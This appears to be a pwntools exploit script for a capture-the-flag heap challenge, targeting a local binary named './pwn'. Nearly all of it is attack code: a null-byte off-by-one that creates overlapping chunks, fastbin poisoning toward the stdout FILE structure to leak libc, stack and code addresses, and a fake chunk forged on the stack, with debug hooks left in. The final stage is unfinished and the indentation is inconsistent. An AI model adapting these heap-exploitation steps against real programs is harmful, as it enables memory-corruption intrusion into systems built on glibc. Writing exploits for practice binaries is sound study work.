#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('Your Choice: ', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size: ', str(size))
	p.sendlineafter('content: ',content)
	print "add a chunk success"

def edit(idx, content):
	menu(3)
	p.sendlineafter('idx: ', str(idx))
	p.sendafter('content: ',content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(2)
	p.sendlineafter('idx: ', str(idx))
	print "free chunk %d success " % idx

def exploit():
	add(0x88, 'a'*0x10)			#0
	add(0x218, 'b'*0x10)		#1
	add(0x108, 'c'*0x10)		#2
	add(0x80, 'd'*0x10)			#3

	#fake
	edit(1, 'a'*0xf0 + p64(0x100) + p64(0x101))
	#into unsorted bin
	free(1)
	#null off by one
	free(0)
	add(0x88, 'a'*0x88)			#0

	#split from 1
	add(0x88, 'b1')				#1
	add(0x68, 'b2')				#4
	add(0x88, 'b3')				#5

	free(1)		
	free(2)						#overlapping above b

	free(4)						#into fastbin

	add(0x88, 'over')			#1	

	#overwrite fastbin'fd to stdout 错位即可拿到IO_stdout
	add(0x290, '')				#2
	edit(2, '\xdd\x45')			

	free(1)
	add(0x88, 'a'*0x80 + p64(0x91) + p64(0x71))	#1 modify size to 0x71 fastbin

	free(5)	
	gdb.attach(p, 'p puts')
	dbg()					
	add(0x68, 'padding')		#4
	add(0x68, 'stdout')			#5

	edit(5, 'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
	data = p.recv(0x90)
  	leak = u64(data[0x88:])                                 #io_file jump
  	print "leak ==> " + hex(leak)

  	if leak&0x7f00000008e0 == 0x7f00000008e0:

	  	libc_base = leak - libc.symbols['_IO_2_1_stdin_']
	  	print "libc_base ==> " + hex(libc_base)
	  	libc.address = libc_base
	  	free_hook = libc.symbols['__free_hook']
	  	malloc_hook = libc.symbols['__malloc_hook']
	  	realloc_hook = libc.symbols['__realloc_hook']

	  	environ = libc.symbols['environ']
	  	print "environ ==> " + hex(environ)

	  	edit(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8))
	  	leakstack = u64(p.recv(6).ljust(8,'\x00'))
	  	print "leakstack ==> " + hex(leakstack)
	  	codeptr = leakstack - 0x30
	  	print "codeptr ==> " + hex(codeptr)


	  	edit(5, '\x00'*0x33+p64(0xfbad1800)+p64(0)*3+p64(codeptr)+p64(codeptr+0x8)+ p64(codeptr+0x8))
	  	codebase = u64(p.recv(6).ljust(8, '\x00')) - 0x969
	  	print "codebase ==> " + hex(codebase)

	  	fakechunk = leakstack - 0xb3
	  	free(4)
	  	edit(2, p64(fakechunk))		#modify fd to fakechunk at stack


	

		p.interactive()
	else:
		p.close()


#_IO_2_1_stdout_
if __name__ == '__main__':
	while 1:
		try:
			p = process('./pwn')
			libc = elf.libc
			exploit()
		except Exception as e:
			dbg()
			p.close()